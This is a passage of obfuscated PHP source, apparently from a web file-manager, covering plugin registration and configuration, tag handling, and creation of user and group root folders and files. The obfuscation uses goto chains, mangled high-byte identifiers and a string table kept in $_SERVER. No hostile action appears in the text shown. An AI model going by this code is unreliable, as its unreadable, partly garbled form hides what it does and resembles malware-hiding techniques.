Dµƒñœ÷Ã±: return is_array($F”ª¢Ç™È) ? $F”ª¢Ç™È : !1; goto cÆÂƒŸÃåù; cÆÂƒŸÃåù: } public function listSource($F¡¾äÊ×, $D”º„§ãÍÔ) { goto bŞéâ­¸ù; a—›™ùñƒĞ: $dé¬‰¤¦¾ = array_to_keyvalue($eçãÛ¼ëæÕ[$B¦ÎŞµ…»à[83]], $B¦ÎŞµ…»à[43], $B¦ÎŞµ…»à[381]); $D‘‹·ÙãÍì = array_merge($dé¬‰¤¦¾, $D´çæï÷¨); foreach ($eÕÙ·ìŠâ as $cæÍ†´¾íÌ) { if (!in_array($cæÍ†´¾íÌ, $D‘‹·ÙãÍì)) { $FÌ¾Ø©ï©[] = $cæÍ†´¾íÌ; } } goto BÆÁ‰¢Ÿ¦; Aì±¨†ê£é: $c£¬ğ»Éê = array(); foreach ($BêŒÍªê›Å as $C©Œõ‰ò¦¡) { $cæÍ†´¾íÌ = $C©Œõ‰ò¦¡[$B¦ÎŞµ…»à[85]]; if (!$cæÍ†´¾íÌ) { continue; } if (!isset($c£¬ğ»Éê[$cæÍ†´¾íÌ])) { $c£¬ğ»Éê[$cæÍ†´¾íÌ] = array(); } $c£¬ğ»Éê[$cæÍ†´¾íÌ][] = $C©Œõ‰ò¦¡[$B¦ÎŞµ…»à[405]]; } $eÕÙ·ìŠâ = array(); goto eŒ£¯ÆÂ—Í; BÆÁ‰¢Ÿ¦: if ($FÌ¾Ø©ï©) { $this->removeBySource($F¡¾äÊ×, $FÌ¾Ø©ï©); } return $eçãÛ¼ëæÕ; goto f²‚ÚŒšŠ˜; eŒ£¯ÆÂ—Í: foreach ($c£¬ğ»Éê as $B‡‰µ³¿È– => $Aº•˜ïòáŒ) { $FŠê‰ñÚƒ = !0; if (!$D”º„§ãÍÔ) { $eÕÙ·ìŠâ[] = $B‡‰µ³¿È–; continue; } foreach ($D”º„§ãÍÔ as $AŞÊŸ±•‡ ) { if (!in_array($AŞÊŸ±•‡ , $Aº•˜ïòáŒ)) { $FŠê‰ñÚƒ = !1; break; } } if ($FŠê‰ñÚƒ) { $eÕÙ·ìŠâ[] = $B‡‰µ³¿È–; } } if (!$eÕÙ·ìŠâ) { return array(); } $eçãÛ¼ëæÕ = Model($B¦ÎŞµ…»à[1107])->listSource(array($B¦ÎŞµ…»à[395] => array($B¦ÎŞµ…»à[396], $eÕÙ·ìŠâ))); goto eÃ÷àë£Ú; eÃ÷àë£Ú: if (!$eçãÛ¼ëæÕ || count($eÕÙ·ìŠâ) == $eçãÛ¼ëæÕ[$B¦ÎŞµ…»à[364]][$B¦ÎŞµ…»à[365]]) { return $eçãÛ¼ëæÕ; } $FÌ¾Ø©ï© = array(); $D´çæï÷¨ = array_to_keyvalue($eçãÛ¼ëæÕ[$B¦ÎŞµ…»à[84]], $B¦ÎŞµ…»à[43], $B¦ÎŞµ…»à[381]); goto a—›™ùñƒĞ; bŞéâ­¸ù: $B¦ÎŞµ…»à =& $_SERVER[¨¤¼…´]; if ($D”º„§ãÍÔ && !is_array($D”º„§ãÍÔ)) { $D”º„§ãÍÔ = array($D”º„§ãÍÔ); } $BêŒÍªê›Å = $this->listData($F¡¾äÊ×); goto Aì±¨†ê£é; f²‚ÚŒšŠ˜: } protected function listData($e¡à‚ëÈøŒ) { $Aò×„ÉÀ„â =& $_SERVER[¨¤¼…´]; $D©ñµ»„„ = array($Aò×„ÉÀ„â[1416] => 0, $Aò×„ÉÀ„â[447] => array($Aò×„ÉÀ„â[2195], 0), $Aò×„ÉÀ„â[400] => $Aò×„ÉÀ„â[2196] . $e¡à‚ëÈøŒ); $cµ™×Ì››Ú = $Aò×„ÉÀ„â[2197]; $bÍ¡–•ÄÁ = $this->field($cµ™×Ì››Ú)->where($D©ñµ»„„)->order($Aò×„ÉÀ„â[2198])->select(); return $bÍ¡–•ÄÁ ? $bÍ¡–•ÄÁ : array(); } protected function addToTag($FŞ‘‰Ã¿­, $AÅ£•á¤İù, $BÌ ˜¦ñ¡‚) { $a÷íÀÖƒì¤ =& $_SERVER[¨¤¼…´]; if (!$this->getByTagID($FŞ‘‰Ã¿­, $BÌ ˜¦ñ¡‚) || !$AÅ£•á¤İù) { return !1; } if (!Model($a÷íÀÖƒì¤[742])->pathInfo($AÅ£•á¤İù)) { return !1; } $DÜÉÇ±‰œ¯ = array($a÷íÀÖƒì¤[1416] => 0, $a÷íÀÖƒì¤[447] => $BÌ ˜¦ñ¡‚, $a÷íÀÖƒì¤[399] => $AÅ£•á¤İù, $a÷íÀÖƒì¤[400] => $a÷íÀÖƒì¤[2199] . $FŞ‘‰Ã¿­, $a÷íÀÖƒì¤[398] => $a÷íÀÖƒì¤[43], $a÷íÀÖƒì¤[2099] => 0); if ($this->where($DÜÉÇ±‰œ¯)->find()) { return !1; } return $this->add($DÜÉÇ±‰œ¯); } protected function removeFromTag($E„ÚÒ‡¯‘Ê, $E²—ĞÇ¯•¶, $AÑ³ª¬‹ó) { $eÑğî›† =& $_SERVER[¨¤¼…´]; if (!$this->getByTagID($E„ÚÒ‡¯‘Ê, $AÑ³ª¬‹ó) || !$E²—ĞÇ¯•¶) { return !1; } if (is_array($E²—ĞÇ¯•¶)) { $E²—ĞÇ¯•¶ = array($eÑğî›†[7], $E²—ĞÇ¯•¶); } $CöêŸ¼íù× = array($eÑğî›†[1416] => 0, $eÑğî›†[447] => $AÑ³ª¬‹ó, $eÑğî›†[400] => $eÑğî›†[2199] . $E„ÚÒ‡¯‘Ê, $eÑğî›†[399] => $E²—ĞÇ¯•¶); return $this->where($CöêŸ¼íù×)->delete(); } protected function removeByTag($f›œ„õäñ†, $d‘÷Ô®È˜) { $a‹»Ã¿“šï =& $_SERVER[¨¤¼…´]; if (!$this->getByTagID($f›œ„õäñ†, $d‘÷Ô®È˜)) { return !1; } $F÷”Ùİ¼Û™ = array($a‹»Ã¿“šï[1416] => 0, $a‹»Ã¿“šï[447] => $d‘÷Ô®È˜, $a‹»Ã¿“šï[400] => $a‹»Ã¿“šï[2199] . $f›œ„õäñ†); return $this->where($F÷”Ùİ¼Û™)->delete(); } protected function removeBySource($eŠ‹ÔÅ‡”, $Bè÷ò–¬†µ) { $C¦ñŸ¢¸âŒ =& $_SERVER[¨¤¼…´]; if (!$eŠ‹ÔÅ‡” || !$Bè÷ò–¬†µ) { return !1; } if (is_array($Bè÷ò–¬†µ)) { $Bè÷ò–¬†µ = array($C¦ñŸ¢¸âŒ[7], $Bè÷ò–¬†µ); } $F¶ÏëÎó‘„ = array($C¦ñŸ¢¸âŒ[1416] => 0, $C¦ñŸ¢¸âŒ[399] => $Bè÷ò–¬†µ, $C¦ñŸ¢¸âŒ[447] => array($C¦ñŸ¢¸âŒ[914], 0), $C¦ñŸ¢¸âŒ[400] => $C¦ñŸ¢¸âŒ[2199] . $eŠ‹ÔÅ‡”); return $this->where($F¶ÏëÎó‘„)->delete(); } } class PluginModel extends ModelBaseLight { public $optionType = "\123\171\x73\164\x65\155\56\x70\154\165\x67\151\x6e\114\151\x73\164"; public $field = array("\x6e\x61\155\x65", "\x73\x74\x61\164\165\x73", "\x72\x65\x67\151\145\163\x74", "\143\x6f\156\146\151\x67"); public function loadList($B•ã×Şø· = false) { $D·İ–¼ªŞ° = array_to_keyvalue($this->listData(), $_SERVER[¨¤¼…´][38]); if ($B•ã×Şø·) { return $D·İ–¼ªŞ°[$B•ã×Şø·]; } return $D·İ–¼ªŞ°; } public function init() { $f•œ‚¿İã¬ =& $_SERVER[¨¤¼…´]; Hook::trigger($f•œ‚¿İã¬[2200]); $Fß„çóÒŠë = $this->loadPluginList(); foreach ($Fß„çóÒŠë as $AÓ¬åÔÆ => $cê‡‰¥•«ê) { $F®­½¤¢šŒ = $this->appAllow($AÓ¬åÔÆ, $cê‡‰¥•«ê); if (!$F®­½¤¢šŒ) { continue; } foreach ($cê‡‰¥•«ê[$f•œ‚¿İã¬[2201]] as $Dğí®ë©½ => $E˜È„‘’ê¸) { Hook::bind($Dğí®ë©½, $E˜È„‘’ê¸); } } Hook::trigger($f•œ‚¿İã¬[2202]); Hook::trigger(ACTION); } public function appAllow($DÒŒšš°‘¶, $FÎ¶Œ¶¸¿, $B´«ïÊ¥¸Ÿ = true) { $e’«£Ÿœã =& $_SERVER[¨¤¼…´]; $e›¹‘ŒÌƒ = PLUGIN_DIR . $DÒŒšš°‘¶ . $e’«£Ÿœã[2203]; if (!is_array($FÎ¶Œ¶¸¿) || !is_array($FÎ¶Œ¶¸¿[$e’«£Ÿœã[2201]]) || !is_file($e›¹‘ŒÌƒ) || $FÎ¶Œ¶¸¿[$e’«£Ÿœã[679]] != 1) { return !1; } if ($B´«ïÊ¥¸Ÿ && !Action($e’«£Ÿœã[2204])->checkAuth($DÒŒšš°‘¶)) { return !1; } return !0; } public function unInstall($bËÍÉä¢Á) { $FŞ†£†®Ú =& $_SERVER[¨¤¼…´]; $d„ÖÑİ£¶ = $this->loadList($bËÍÉä¢Á); if (file_exists(PLUGIN_DIR . $bËÍÉä¢Á)) { Hook::apply($bËÍÉä¢Á . $FŞ†£†®Ú[2205]); } $this->remove($d„ÖÑİ£¶[$FŞ†£†®Ú[379]]); } public function changeStatus($bÎ’­ÀÕ Ñ, $C´­§åæßâ) { $Aö‘©ªĞ· =& $_SERVER[¨¤¼…´]; $eùğ·Ü‚áÈ = $this->loadList($bÎ’­ÀÕ Ñ); if ($C´­§åæßâ) { Hook::apply($bÎ’­ÀÕ Ñ . $Aö‘©ªĞ·[2206]); } $this->update($eùğ·Ü‚áÈ[$Aö‘©ªĞ·[379]], array($Aö‘©ªĞ·[2207] => $C´­§åæßâ)); } public function appRegist($f‡©„ö×á, $FºÅ‘Ÿï˜‚) { $c§˜¢Êœ§« =& $_SERVER[¨¤¼…´]; $FÁÛ‘Œ‰ = $this->loadList($f‡©„ö×á); if ($FÁÛ‘Œ‰) { $this->update($FÁÛ‘Œ‰[$c§˜¢Êœ§«[379]], array($c§˜¢Êœ§«[2201] => $FºÅ‘Ÿï˜‚)); } else { $FìÖó¼Ãùµ = array($c§˜¢Êœ§«[38] => $f‡©„ö×á, $c§˜¢Êœ§«[2201] => $FºÅ‘Ÿï˜‚, $c§˜¢Êœ§«[679] => 0, $c§˜¢Êœ§«[6] => $this->getConfigDefault($f‡©„ö×á)); $this->insert($FìÖó¼Ãùµ); } } public function getConfigDefault($cˆâ ÚÁ’) { $E¹ªõöÀÎÚ =& $_SERVER[¨¤¼…´]; $AÓ¿òÖÑÊ = array(); $c˜ÒÃĞõ±× = $this->getPackageJson($cˆâ ÚÁ’); if (!$c˜ÒÃĞõ±× && is_array($c˜ÒÃĞõ±×[$E¹ªõöÀÎÚ[2208]])) { return $AÓ¿òÖÑÊ; } foreach ($c˜ÒÃĞõ±×[$E¹ªõöÀÎÚ[2208]] as $fÔÀª¯˜µ´ => $b…ãÖŞ½Š¡) { if (!isset($b…ãÖŞ½Š¡[$E¹ªõöÀÎÚ[372]]) || isset($AÓ¿òÖÑÊ[$fÔÀª¯˜µ´])) { continue; } $AÓ¿òÖÑÊ[$fÔÀª¯˜µ´] = $b…ãÖŞ½Š¡[$E¹ªõöÀÎÚ[372]]; } return $AÓ¿òÖÑÊ; } public function getPackageJson($eë†¢ÂĞ¯) { return Hook::apply($eë†¢ÂĞ¯ . $_SERVER[¨¤¼…´][2209]); } public function getConfig($bˆšËŒ˜, $d‰‹¸à‰Ã” = false) { $EàÆÕßìõ´ =& $_SERVER[¨¤¼…´]; $f›õÍš‰ÍØ = array(); $b×–Ô»¯’ö = $this->loadList($bˆšËŒ˜); if ($b×–Ô»¯’ö && is_array($b×–Ô»¯’ö[$EàÆÕßìõ´[6]])) { $f›õÍš‰ÍØ = $b×–Ô»¯’ö[$EàÆÕßìõ´[6]]; } if (!$f›õÍš‰ÍØ || $d‰‹¸à‰Ã”) { $f›õÍš‰ÍØ = $this->getConfigDefault($bˆšËŒ˜); } return $f›õÍš‰ÍØ; } public function setConfig($bòå‡Ã‚Ä‰, $c·ÅÅÂŠÇô = false) { goto C‰½Ïöóè´; C‰½Ïöóè´: $b¤¯’ô¯”ƒ =& $_SERVER[¨¤¼…´]; $b™æèğ²…˜ = $this->loadList($bòå‡Ã‚Ä‰); if (!$b™æèğ²…˜) { return !1; } goto dªƒŠÎØŒö; dªƒŠÎØŒö: $B½›õè¸¦ = $b™æèğ²…˜[$b¤¯’ô¯”ƒ[6]]; if ($c·ÅÅÂŠÇô == !1) { $B½›õè¸¦ = array(); $c·ÅÅÂŠÇô = $this->getConfigDefault($bòå‡Ã‚Ä‰); } foreach ($c·ÅÅÂŠÇô as $e‚„š˜·¤È => $fá‰Øˆä£²) { $B½›õè¸¦[$e‚„š˜·¤È] = is_string($fá‰Øˆä£²) ? trim($fá‰Øˆä£²) : $fá‰Øˆä£²; } goto AÜÑù¶‘ò; AÜÑù¶‘ò: $this->update($b™æèğ²…˜[$b¤¯’ô¯”ƒ[379]], array($b¤¯’ô¯”ƒ[6] => $B½›õè¸¦)); goto c œÎ³™Çê; c œÎ³™Çê: } public function viewList() { goto bç–Æ„‰¶³; bç–Æ„‰¶³: $A£ñİø¤ÚÏ =& $_SERVER[¨¤¼…´]; $cœÅ‚ÓÍ¸µ = $this->loadList(); $this->pluginScan($cœÅ‚ÓÍ¸µ); goto e„•Š—›­; bñåÈ¾¼†Ï: return $FÊÆ­òáã¼; goto cµ°ìÖÜê“; e„•Š—›­: $cœÅ‚ÓÍ¸µ = $this->loadPluginList(); $FÊÆ­òáã¼ = array(); foreach ($cœÅ‚ÓÍ¸µ as $Bµƒ²ß•†Œ => $Aù‡‚ŠÓÉô) { unset($Aù‡‚ŠÓÉô[$A£ñİø¤ÚÏ[2201]], $Aù‡‚ŠÓÉô[$A£ñİø¤ÚÏ[6]]); $E¬·ƒö¬‘ = PLUGIN_DIR . $Aù‡‚ŠÓÉô[$A£ñİø¤ÚÏ[38]] . $A£ñİø¤ÚÏ[2203]; if (!is_file($E¬·ƒö¬‘)) { continue; } $f†Å•©¶ÎŞ = Hook::apply($Aù‡‚ŠÓÉô[$A£ñİø¤ÚÏ[38]] . $A£ñİø¤ÚÏ[2209]); if (is_array($f†Å•©¶ÎŞ)) { $FÊÆ­òáã¼[$Bµƒ²ß•†Œ] = array_merge($Aù‡‚ŠÓÉô, $f†Å•©¶ÎŞ); } } goto bñåÈ¾¼†Ï; cµ°ìÖÜê“: } private function loadPluginList() { $aë¡‡É‡…’ =& $_SERVER[¨¤¼…´]; $B˜›µÜæèÀ = $this->loadList(); if (strtolower(MOD) == $aë¡‡É‡…’[2210]) { return $B˜›µÜæèÀ; } $D¯·²…Ô§î = Hook::trigger($aë¡‡É‡…’[2211], $B˜›µÜæèÀ); if ($B˜›µÜæèÀ && !$D¯·²…Ô§î) { die; } return $D¯·²…Ô§î ? $D¯·²…Ô§î : $B˜›µÜæèÀ; } private function pluginScan($D±éÃ†ÇÆâ) { $cøŒ ˜§õ =& $_SERVER[¨¤¼…´]; recursion_dir(PLUGIN_DIR, $FİäšÇä, $Fƒ…İš†°Ò, 0); foreach ($FİäšÇä as $A‹ôåãœœ·) { $c‡´¯¸ïØª = get_path_this($A‹ôåãœœ·); if (isset($D±éÃ†ÇÆâ[$c‡´¯¸ïØª]) || !file_exists($A‹ôåãœœ· . $cøŒ ˜§õ[2212]) || !file_exists($A‹ôåãœœ· . $cøŒ ˜§õ[2203])) { continue; } Hook::apply($c‡´¯¸ïØª . $cøŒ ˜§õ[2206]); } } } goto C”ùŸì‘âÓ; aò§²åŞÙí: class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($A†…³â ÈÂ) { $aÇÙÌ¦©Èİ =& $_SERVER[¨¤¼…´]; $b£Ø…‡ÃÔÊ = Model($aÇÙÌ¦©Èİ[487])->where(array($aÇÙÌ¦©Èİ[1416] => $A†…³â ÈÂ))->find(); $A¤ŠõôËØ = $this->_mkdirRoot(SourceModel::TYPE_USER, $A†…³â ÈÂ, $b£Ø…‡ÃÔÊ[$aÇÙÌ¦©Èİ[38]]); $this->userDesktopAdd($A¤ŠõôËØ); return $A¤ŠõôËØ; } public function userDesktopAdd($f¢á’øĞœ‹) { $EÚÔ¨çˆ˜ =& $_SERVER[¨¤¼…´]; $EÒĞËÒ×ƒ  = LNG($EÚÔ¨çˆ˜[2348]); $DµáÈ—îÈÆ = $this->mkdir($f¢á’øĞœ‹, $EÒĞËÒ×ƒ ); $this->metaSet($DµáÈ—îÈÆ, $EÚÔ¨çˆ˜[2349], $EÚÔ¨çˆ˜[93]); $this->metaSet($f¢á’øĞœ‹, $EÚÔ¨çˆ˜[2350], $DµáÈ—îÈÆ); } public function groupRootAdd($e¡âŸ®¾•Ñ) { $aÀ—Ê¨”´ =& $_SERVER[¨¤¼…´]; $f’èİâµó± = Model($aÀ—Ê¨”´[471])->where(array($aÀ—Ê¨”´[2172] => $e¡âŸ®¾•Ñ))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $e¡âŸ®¾•Ñ, $f’èİâµó±[$aÀ—Ê¨”´[38]]); } public function systemRootPathAdd($b…Á¸Å—ËÄ) { if ($b…Á¸Å—ËÄ != $_SERVER[¨¤¼…´][1079]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $b…Á¸Å—ËÄ); } public function userRootRemove($c¶Õ‹âÙ«İ) { $eÊÙ¥ÜÛÒŸ = $this->sourceRoot(SourceModel::TYPE_USER, $c¶Õ‹âÙ«İ); if (!$eÊÙ¥ÜÛÒŸ) { return; } $this->remove($eÊÙ¥ÜÛÒŸ, !1); } public function groupRootRemove($F†ãÓËÀ•) { $b¨Ô¦íÌ’Ì = $this->sourceRoot(SourceModel::TYPE_GROUP, $F†ãÓËÀ•); if (!$b¨Ô¦íÌ’Ì) { return; } $this->remove($b¨Ô¦íÌ’Ì, !1); } private function _mkdirRoot($eÑ›®ÁÓã³, $d¾¹êĞÙ‡, $AãÙÕ‡Ë´) { goto aî¡«¢î©; aî¡«¢î©: $a™éƒ÷ô¤ =& $_SERVER[¨¤¼…´]; $D³™‚ŒÓ = array($a™éƒ÷ô¤[380] => 0, $a™éƒ÷ô¤[534] => $eÑ›®ÁÓã³, $a™éƒ÷ô¤[535] => $d¾¹êĞÙ‡, $a™éƒ÷ô¤[531] => 1, $a™éƒ÷ô¤[536] => USER_ID, $a™éƒ÷ô¤[537] => USER_ID, $a™éƒ÷ô¤[532] => $a™éƒ÷ô¤[43], $a™éƒ÷ô¤[538] => $a™éƒ÷ô¤[483], $a™éƒ÷ô¤[408] => 0, $a™éƒ÷ô¤[533] => 0, $a™éƒ÷ô¤[432] => 0, $a™éƒ÷ô¤[539] => $a™éƒ÷ô¤[43]); if ($B¼ÍÊå¡Ï = $this->where($D³™‚ŒÓ)->find()) { return $B¼ÍÊå¡Ï[$a™éƒ÷ô¤[381]]; } goto A–êŒôö‘; BóÒ‰‹²æ: CacheLock::unlock($c¡»éÂÏÜº); return $A™Âé›âğÑ; goto AÔÇê›Ô¶æ; A–êŒôö‘: $c¡»éÂÏÜº = "\x4d\x6f\x64\x65\154\123\x6f\165\162\143\145\x2e\x6d\x6b\x64\x69\x72\x52\157\x6f\x74\56{$eÑ›®ÁÓã³}\56{$d¾¹êĞÙ‡}\56" . $AãÙÕ‡Ë´; CacheLock::lock($c¡»éÂÏÜº); $D³™‚ŒÓ[$a™éƒ÷ô¤[38]] = $AãÙÕ‡Ë´; goto E‰ç¢…µÈœ; E‰ç¢…µÈœ: $A™Âé›âğÑ = $this->add($D³™‚ŒÓ); $EÏ £ùø´ = array($a™éƒ÷ô¤[540] => short_id($A™Âé›âğÑ)); $this->where(array($a™éƒ÷ô¤[395] => $A™Âé›âğÑ))->save($EÏ £ùø´); goto BóÒ‰‹²æ; AÔÇê›Ô¶æ: } private function sourceRoot($eºì‹Ç¹, $EÁœ·¾ˆèÛ, $AÙ´ìÙ²ÓÓ = false) { $f‚ÏØÁç³‘ =& $_SERVER[¨¤¼…´]; $AöÜº½˜±» = array($f‚ÏØÁç³‘[380] => 0, $f‚ÏØÁç³‘[534] => $eºì‹Ç¹, $f‚ÏØÁç³‘[535] => $EÁœ·¾ˆèÛ); if ($FÄ†£İŒà = $this->where($AöÜº½˜±»)->find()) { return $AÙ´ìÙ²ÓÓ ? $FÄ†£İŒà : $FÄ†£İŒà[$f‚ÏØÁç³‘[381]]; } return !1; } public function sourceRootGroup($bŞËâñ¡¥) { $EÑéöåĞÚå =& $_SERVER[¨¤¼…´]; if (is_string($bŞËâñ¡¥)) { $bŞËâñ¡¥ = array($bŞËâñ¡¥); } $fç‰ôäÌ±’ = array($EÑéöåĞÚå[380] => 0, $EÑéöåĞÚå[534] => SourceModel::TYPE_GROUP, $EÑéöåĞÚå[535] => array($EÑéöåĞÚå[7], $bŞËâñ¡¥)); $cÖÖà£¿¨´ = $this->listSource($fç‰ôäÌ±’, 1000); return array_to_keyvalue($cÖÖà£¿¨´[$EÑéöåĞÚå[84]], $EÑéöåĞÚå[469]); } public function mkfile($FÙñ½Áó³‡, $cÓ÷¼”, $C¨œÔ¾¸µ½ = '', $eó‘Š‘‚‹Î = REPEAT_RENAME) { $FÉƒÌ®¾Ç× =& $_SERVER[¨¤¼…´]; $AÒæõ´²Š• = Model($FÉƒÌ®¾Ç×[556])->addFileByContent($C¨œÔ¾¸µ½, $cÓ÷¼”); return $this->_createFileCall($FÙñ½Áó³‡, $cÓ÷¼”, $AÒæõ´²Š•, $eó‘Š‘‚‹Î, $FÉƒÌ®¾Ç×[1116]); } public function addFile($EÀ¨èÍÄ¬º, $Aˆ¾Ï¶ôËÀ, $bàóÒõœùÖ, $fåÕº›Ÿ¾ = false, $b×Ì„Ø´ªè = REPEAT_RENAME) { $aà†šÍÇ‰Ø = Model($_SERVER[¨¤¼…´][556])->addFile($Aˆ¾Ï¶ôËÀ, $bàóÒõœùÖ, $fåÕº›Ÿ¾); return $this->_createFileCall($EÀ¨èÍÄ¬º, $bàóÒõœùÖ, $aà†šÍÇ‰Ø, $b×Ì„Ø´ªè); } public function addFileByFileID($c½…°¾Œœ, $FİÜÓˆÀŒ×, $c‡¿¨İ˜Š¦, $f‘ÄÃ¿ùÒ = REPEAT_RENAME) { $FÁ§„öµ† =& $_SERVER[¨¤¼…´]; $D¥é¦Í¯Ô = Model($FÁ§„öµ†[556])->find($FİÜÓˆÀŒ×); Model($FÁ§„öµ†[556])->linkAdd($FİÜÓˆÀŒ×); return $this->_createFileCall($c½…°¾Œœ, $c‡¿¨İ˜Š¦, $D¥é¦Í¯Ô, $f‘ÄÃ¿ùÒ); } public function addFileByRemote($C™Å òŸ†í, $B¹µÙ‰‹ùÁ, $dîù‹Ñ’Ÿ¥, $f´¸É Úµ = array(), $BÊí¨ğ“ÈŠ = REPEAT_RENAME) { $c©¶¡ì²¬ß = Model($_SERVER[¨¤¼…´][556])->addFileByRemote($B¹µÙ‰‹ùÁ, $dîù‹Ñ’Ÿ¥, $f´¸É Úµ); return $this->_createFileCall($C™Å òŸ†í, $dîù‹Ñ’Ÿ¥, $c©¶¡ì²¬ß, $BÊí¨ğ“ÈŠ); } private function _createFileCall($d’Á®åîŒ“, $e‚À­£²›¢, $eâµ‚ĞŠ, $A Ö†Çôò, $Cªµ‚õÏÅ˜ = "\x75\160\154\x6f\x61\144") { goto a Ä„’™‹µ; AÆÖöŞ¤Ÿà: $d¦Ê‘…­ÕÕ = $this->_createFile($d’Á®åîŒ“, $e‚À­£²›¢, $eâµ‚ĞŠ, $A Ö†Çôò, $f¼Ş‚ŒÁéò); if (!$f¼Ş‚ŒÁéò) { Model($cƒ’¼©õ­[434])->remove($eâµ‚ĞŠ[$cƒ’¼©õ­[431]]); } else { if ($d¦Ê‘…­ÕÕ) { Model($cƒ’¼©õ­[2320])->eventCreate($d¦Ê‘…­ÕÕ, $Cªµ‚õÏÅ˜); } } $this->lockWriteEnd($d’Á®åîŒ“, $e‚À­£²›¢); goto c±»öâŠù™; a Ä„’™‹µ: $cƒ’¼©õ­ =& $_SERVER[¨¤¼…´]; $f¼Ş‚ŒÁéò = !1; $this->lockWriteStart($d’Á®åîŒ“, $e‚À­£²›¢); goto AÆÖöŞ¤Ÿà; c±»öâŠù™: return $d¦Ê‘…­ÕÕ; goto E¦œŞœ·ù; E¦œŞœ·ù: } public function mkdir($B®î¸¾¾´›, $DƒêĞë÷¡, $e¦Œò‡ÀöÓ = REPEAT_SKIP) { goto f«Ìóòàˆ‡; f«Ìóòàˆ‡: $e•„Œ¥‰ =& $_SERVER[¨¤¼…´]; $FŸåšÃõÓ = $this->sourceInfo($B®î¸¾¾´›); if (!$FŸåšÃõÓ) { return !1; } goto cîªÒÊ½ƒ„; E—ÏŒË¥: return $F£®°Àº¹£; goto fèÙÇ£Àø¯; Díƒ¥Ô†æµ: $F£®°Àº¹£ = $this->_addSoure($a³¼“‡›Ë, $FŸåšÃõÓ); Model($e•„Œ¥‰[2320])->eventCreate($F£®°Àº¹£, $e•„Œ¥‰[1117]); $this->lockWriteEnd($B®î¸¾¾´›, $DƒêĞë÷¡); goto E—ÏŒË¥; cîªÒÊ½ƒ„: $this->lockWriteStart($B®î¸¾¾´›, $DƒêĞë÷¡); if ($e¦Œò‡ÀöÓ !== !1) { $Aà¦‹›‹ = $this->fileNameExist($B®î¸¾¾´›, $DƒêĞë÷¡); if ($Aà¦‹›‹ && $e¦Œò‡ÀöÓ != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($B®î¸¾¾´›, $DƒêĞë÷¡); return $Aà¦‹›‹; } $DƒêĞë÷¡ = $this->fileNameAuto($B®î¸¾¾´›, $DƒêĞë÷¡, $e¦Œò‡ÀöÓ); } $a³¼“‡›Ë = array($e•„Œ¥‰[531] => 1, $e•„Œ¥‰[398] => $DƒêĞë÷¡, $e•„Œ¥‰[532] => $e•„Œ¥‰[43], $e•„Œ¥‰[432] => 0, $e•„Œ¥‰[533] => 0); goto Díƒ¥Ô†æµ; fèÙÇ£Àø¯: } private function _createFile($dÙ³ò’ƒÂ, $eåÄÅ‚†æ›, $d‰±ñÏğÊª, $f×ÕÏğ¿ğ¾, &$Fã’À´¼¼) { goto eºåÀ‡ôîÆ; Bù“ëó²‚: if ($f×ÕÏğ¿ğ¾ !== !1) { $e»Ç¯±”Í¨ = $this->fileNameExist($dÙ³ò’ƒÂ, $eåÄÅ‚†æ›); } $Fã’À´¼¼ = !0; if ($f×ÕÏğ¿ğ¾ && $e»Ç¯±”Í¨) { if ($f×ÕÏğ¿ğ¾ == REPEAT_SKIP) { $Fã’À´¼¼ = !1; return $e»Ç¯±”Í¨; } else { if ($f×ÕÏğ¿ğ¾ == REPEAT_REPLACE) { $C¢¦ˆ‚Şø = $this->sourceInfo($e»Ç¯±”Í¨); $AÏ©ãñÍñî = $this->fileHistory($C¢¦ˆ‚Şø, $d‰±ñÏğÊª[$aÜ£´³¼„[431]], $d‰±ñÏğÊª[$aÜ£´³¼„[87]]); if (!$AÏ©ãñÍñî) { $Fã’À´¼¼ = !1; } else { $this->folderSizeReset($dÙ³ò’ƒÂ); } return $e»Ç¯±”Í¨; } else { $eåÄÅ‚†æ› = $this->fileNameAuto($dÙ³ò’ƒÂ, $eåÄÅ‚†æ›, $f×ÕÏğ¿ğ¾, !1); } } } goto f‡¬›ŸšŞ; eºåÀ‡ôîÆ: $aÜ£´³¼„ =& $_SERVER[¨¤¼…´]; $FÕŸÛ’Ğ† = $this->sourceInfo($dÙ³ò’ƒÂ); if (!$d‰±ñÏğÊª || !$FÕŸÛ’Ğ†) { return !1; } goto Bù“ëó²‚; f‡¬›ŸšŞ: $f’¦Ä‚¢è  = array($aÜ£´³¼„[531] => 0, $aÜ£´³¼„[398] => $eåÄÅ‚†æ›, $aÜ£´³¼„[532] => get_path_ext($eåÄÅ‚†æ›), $aÜ£´³¼„[432] => $d‰±ñÏğÊª[$aÜ£´³¼„[431]], $aÜ£´³¼„[533] => $d‰±ñÏğÊª[$aÜ£´³¼„[87]]); $AæÇ„ ‡Œ = $this->_addSoure($f’¦Ä‚¢è , $FÕŸÛ’Ğ†); $this->folderSizeReset($dÙ³ò’ƒÂ); goto e›¦ŞŠÙóù; e›¦ŞŠÙóù: return $AæÇ„ ‡Œ; goto FÅ“®‹ùãœ; FÅ“®‹ùãœ: } protected function fileHistory($Bï¶ñÏ¤¼‰, $fÂìí”î©¼, $F¡ò‰£Ìçæ) { goto eôØ¨ÜĞˆº; b‹ˆæâ‡‡¹: return !0; goto C±Ã×’ùé•; d¾¢šùØ¥Ã: Model($Cô¦ùä‡ô…[2351])->addHistory($Bï¶ñÏ¤¼‰); $E¶—áì’ªè = array($Cô¦ùä‡ô…[537] => USER_ID, $Cô¦ùä‡ô…[402] => time(), $Cô¦ùä‡ô…[431] => $fÂìí”î©¼, $Cô¦ùä‡ô…[87] => $F¡ò‰£Ìçæ); $this->where(array($Cô¦ùä‡ô…[395] => $Bï¶ñÏ¤¼‰[$Cô¦ùä‡ô…[381]]))->save($E¶—áì’ªè); goto b‹ˆæâ‡‡¹; eôØ¨ÜĞˆº: $Cô¦ùä‡ô… =& $_SERVER[¨¤¼…´]; if ($Bï¶ñÏ¤¼‰[$Cô¦ùä‡ô…[431]] == $fÂìí”î©¼) { return !1; } $this->checkLock($Bï¶ñÏ¤¼‰[$Cô¦ùä‡ô…[381]], $fÂìí”î©¼); goto d¾¢šùØ¥Ã; C±Ã×’ùé•: } public function checkLock($f‰¹°‡Ú©Å, $dÄééÙ…Ò) { goto bõÇ¥Õî™…; fàÍË¦íŠ: show_json(LNG($dõ’ ĞÃâ‰[2354]) . $dõ’ ĞÃâ‰[2355] . LNG($dõ’ 